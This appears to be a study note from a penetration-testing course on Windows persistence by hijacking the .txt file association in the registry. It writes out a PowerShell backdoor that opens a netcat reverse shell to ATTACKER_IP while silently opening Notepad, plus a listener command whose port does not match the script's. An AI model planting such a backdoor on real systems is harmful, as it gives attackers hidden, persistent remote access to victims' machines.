#### Goal
In addition to persisting through executables or shortcuts, we can ***hijack any file associations to force the operating system to run a shell*** whenever the user opens a specific file type. A ***backdoor payload runs silently***, then opens the expected file normally - preserving behaviour.

#### How it Works
In this example, we are using `.txt` file.

1. The default OS ***file associations are kept inside the registry***:
	- Path: `HKLM\Software\Classes\.txt`
	- `Programmatic ID (ProgID):` A ProgID is simply an identifier to a program installed on the system
		- Shows the **ProgID** for `.txt` -> usually `txtfile.`
		![[ProgID.png]]

2. ***Search for a subkey for the corresponding ProgID:*** `txtfile` in this case
	- Location: `HKLM\Software\Classes\txtfile\shell\open\command`
		![[Subkey.png]]	
	- When you open a `.txt` file, the system will execute: `**%SystemRoot%\system32\NOTEPAD.EXE %1**`, where `%1` represents the name of the opened file.

3. Hijack this extension:
	- We could replace the command with a script that executes a backdoor and then opens the file as usual.

4. Create a Backdoor Script:
	- Save as `C:\Windows\backdoor2.ps1`
		```powershell
		Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
		C:\Windows\system32\NOTEPAD.EXE $args[0]
		```
		Notice, we have to pass **`$args[0]`** to notepad, as it will contain the name of the file to be opened, as given through `%1`.

5. Modify Registry to run our backdoor script:
	![[Modify Registry to execute the backdoor.png]]

6. Create a listener on your kali machine:
```
nc -nvlp 4444
```